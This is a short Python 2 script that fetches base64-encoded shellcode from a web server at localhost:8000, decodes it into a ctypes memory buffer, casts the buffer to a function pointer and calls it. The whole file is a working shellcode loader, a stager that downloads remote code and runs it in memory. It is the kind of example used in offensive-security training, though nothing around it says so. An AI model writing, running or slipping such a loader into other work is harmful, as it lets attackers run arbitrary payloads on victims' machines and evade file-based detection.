# get the shellcode from a web server in base64 format
import urllib2
# for creating function pointers to buffer in memory
import ctypes
import base64

# get the shellcode from the set up web server
url = "http://localhost:8000/shellcode.bin"
response = urllib2.urlopen(url)

# decode the shellcode from base64 format
shellcode = base64.b64decode(response.read())

# make a buffer in memory holding the decoded shellcode
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# create a function pointer to the shellcode
#   the cast() makes the buffer act like a function pointer
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# call the shellcode with the function
shellcode_func()
